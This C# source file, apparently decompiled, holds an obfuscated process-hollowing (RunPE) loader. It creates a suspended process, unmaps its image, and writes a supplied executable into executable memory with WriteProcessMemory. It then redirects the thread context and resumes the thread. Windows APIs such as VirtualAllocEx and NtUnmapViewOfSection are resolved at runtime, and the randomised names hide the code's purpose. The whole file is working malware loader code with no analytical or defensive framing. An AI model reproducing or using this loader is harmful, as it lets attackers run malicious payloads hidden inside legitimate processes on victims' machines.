using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class YCtEzgtHwiTtKkyWurLpecvcLWNpuVbcIHsKZfTMvBW
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool QlzIPoyxyuUehZDXkikHs(IntPtr baGntDozlHCDMlKEqIbVSUdPlQwJeczqS, uint[] Part2);

	public delegate uint WVQiUIcBcMwJSPVzY(IntPtr baGntDozlHCDMlKEqIbVSUdPlQwJeczqS);

	public delegate uint lFOlkSKDaesaOLTvZgPyEoMGpQulkoGRFIdYa(IntPtr baGntDozlHCDMlKEqIbVSUdPlQwJeczqS, IntPtr Part2);

	public delegate IntPtr tFDYqkIiyTIAMqHKTaGTrcEfHuUpVtZmBolZnvZrynjLHXOqhVKonVeu(IntPtr baGntDozlHCDMlKEqIbVSUdPlQwJeczqS, IntPtr Part2, IntPtr Part3, int Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool PCFRsOvcYtETMEJGxUUroE(IntPtr baGntDozlHCDMlKEqIbVSUdPlQwJeczqS, uint[] Part2);

	public delegate bool qmqFqNxpiPVraIuYilRGxUxcJbSJCqBqMCFbkMJkLngcPwCiKqtwOH(IntPtr baGntDozlHCDMlKEqIbVSUdPlQwJeczqS, IntPtr Part2, byte[] Part3, uint Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool JWmHhuBXTwXpphqaXeYWQMcHgXdL(IntPtr baGntDozlHCDMlKEqIbVSUdPlQwJeczqS, IntPtr Part2, ref IntPtr Part3, int Part4, ref IntPtr Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool KPefsUYrrnfBmojheRquEYrxwFiZZLMOjEYNGzWfZ(string baGntDozlHCDMlKEqIbVSUdPlQwJeczqS, StringBuilder Part2, IntPtr Part3, IntPtr Part4, [MarshalAs(UnmanagedType.Bool)] bool Part5, int Part6, IntPtr Part7, string Part8, byte[] Part9, IntPtr[] baGntDozlHCDMlKEqIbVSUdPlQwJeczqS0);

	private static QlzIPoyxyuUehZDXkikHs qlzIPoyxyuUehZDXkikHs_0 = HlKVIWSaFEEitOHqotmFszfLkKA<QlzIPoyxyuUehZDXkikHs>("kernel32", "SetThreadContext");

	private static WVQiUIcBcMwJSPVzY wvqiUIcBcMwJSPVzY_0 = HlKVIWSaFEEitOHqotmFszfLkKA<WVQiUIcBcMwJSPVzY>("kernel32", "ResumeThread");

	private static lFOlkSKDaesaOLTvZgPyEoMGpQulkoGRFIdYa lFOlkSKDaesaOLTvZgPyEoMGpQulkoGRFIdYa_0 = HlKVIWSaFEEitOHqotmFszfLkKA<lFOlkSKDaesaOLTvZgPyEoMGpQulkoGRFIdYa>("ntdll", "NtUnmapViewOfSection");

	private static tFDYqkIiyTIAMqHKTaGTrcEfHuUpVtZmBolZnvZrynjLHXOqhVKonVeu tFDYqkIiyTIAMqHKTaGTrcEfHuUpVtZmBolZnvZrynjLHXOqhVKonVeu_0 = HlKVIWSaFEEitOHqotmFszfLkKA<tFDYqkIiyTIAMqHKTaGTrcEfHuUpVtZmBolZnvZrynjLHXOqhVKonVeu>("kernel32", "VirtualAllocEx");

	private static PCFRsOvcYtETMEJGxUUroE pcfrsOvcYtETMEJGxUUroE_0 = HlKVIWSaFEEitOHqotmFszfLkKA<PCFRsOvcYtETMEJGxUUroE>("kernel32", "GetThreadContext");

	private static qmqFqNxpiPVraIuYilRGxUxcJbSJCqBqMCFbkMJkLngcPwCiKqtwOH qmqFqNxpiPVraIuYilRGxUxcJbSJCqBqMCFbkMJkLngcPwCiKqtwOH_0 = HlKVIWSaFEEitOHqotmFszfLkKA<qmqFqNxpiPVraIuYilRGxUxcJbSJCqBqMCFbkMJkLngcPwCiKqtwOH>("kernel32", "WriteProcessMemory");

	private static JWmHhuBXTwXpphqaXeYWQMcHgXdL jwmHhuBXTwXpphqaXeYWQMcHgXdL_0 = HlKVIWSaFEEitOHqotmFszfLkKA<JWmHhuBXTwXpphqaXeYWQMcHgXdL>("kernel32", "ReadProcessMemory");

	private static KPefsUYrrnfBmojheRquEYrxwFiZZLMOjEYNGzWfZ kpefsUYrrnfBmojheRquEYrxwFiZZLMOjEYNGzWfZ_0 = HlKVIWSaFEEitOHqotmFszfLkKA<KPefsUYrrnfBmojheRquEYrxwFiZZLMOjEYNGzWfZ>("kernel32", "CreateProcessA");

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr Handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	public static T HlKVIWSaFEEitOHqotmFszfLkKA<T>(string BMznndj, string WhXaDiphdqkxjbcncQQSTQHfeCCtIX)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref BMznndj), ref WhXaDiphdqkxjbcncQQSTQHfeCCtIX), typeof(T));
	}

	public static bool uEuNvKPBveLNYQzOmpJZYXlZuMZBxK(byte[] zmetxfvUGFlRYoiodfJbk, string PDNcopoKbiAGAeSDhiafJslxbsvBdMXe)
	{
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] part = new byte[68];
				int num = BitConverter.ToInt32(zmetxfvUGFlRYoiodfJbk, 60);
				int num2 = BitConverter.ToInt16(zmetxfvUGFlRYoiodfJbk, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(zmetxfvUGFlRYoiodfJbk, num + 84));
				if (kpefsUYrrnfBmojheRquEYrxwFiZZLMOjEYNGzWfZ_0(null, new StringBuilder(PDNcopoKbiAGAeSDhiafJslxbsvBdMXe), zero, zero, Part5: false, 4, zero, null, part, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (pcfrsOvcYtETMEJGxUUroE_0(array[1], array2))
					{
						IntPtr part2 = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr Part = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr Part2 = IntPtr.Zero;
						if ((jwmHhuBXTwXpphqaXeYWQMcHgXdL_0(array[0], part2, ref Part, (int)intPtr2, ref Part2) && unchecked((long)lFOlkSKDaesaOLTvZgPyEoMGpQulkoGRFIdYa_0(array[0], Part)) == 0L) ? true : false)
						{
							IntPtr part3 = new IntPtr(BitConverter.ToInt32(zmetxfvUGFlRYoiodfJbk, num + 52));
							IntPtr part4 = new IntPtr(BitConverter.ToInt32(zmetxfvUGFlRYoiodfJbk, num + 80));
							IntPtr part5 = tFDYqkIiyTIAMqHKTaGTrcEfHuUpVtZmBolZnvZrynjLHXOqhVKonVeu_0(array[0], part3, part4, 12288, 64);
							int part6 = default(int);
							qmqFqNxpiPVraIuYilRGxUxcJbSJCqBqMCFbkMJkLngcPwCiKqtwOH_0(array[0], part5, zmetxfvUGFlRYoiodfJbk, (uint)(int)intPtr, part6);
							int num3 = num2 - 1;
							int num4 = num3;
							int num5 = 0;
							while (true)
							{
								int num6 = num5;
								int num7 = num4;
								if (num6 > num7)
								{
									break;
								}
								int[] array3 = new int[10];
								Buffer.BlockCopy(zmetxfvUGFlRYoiodfJbk, num + 248 + num5 * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(zmetxfvUGFlRYoiodfJbk, array3[5], array4, 0, array4.Length);
								part4 = new IntPtr(part5.ToInt32() + array3[3]);
								part3 = new IntPtr(array4.Length);
								qmqFqNxpiPVraIuYilRGxUxcJbSJCqBqMCFbkMJkLngcPwCiKqtwOH_0(array[0], part4, array4, (uint)(int)part3, part6);
								num5++;
							}
							part4 = new IntPtr(unchecked((long)array2[41]) + 8L);
							part3 = new IntPtr(4);
							qmqFqNxpiPVraIuYilRGxUxcJbSJCqBqMCFbkMJkLngcPwCiKqtwOH_0(array[0], part4, BitConverter.GetBytes(part5.ToInt32()), (uint)(int)part3, part6);
							array2[44] = (uint)(part5.ToInt32() + BitConverter.ToInt32(zmetxfvUGFlRYoiodfJbk, num + 40));
							qlzIPoyxyuUehZDXkikHs_0(array[1], array2);
						}
					}
					wvqiUIcBcMwJSPVzY_0(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
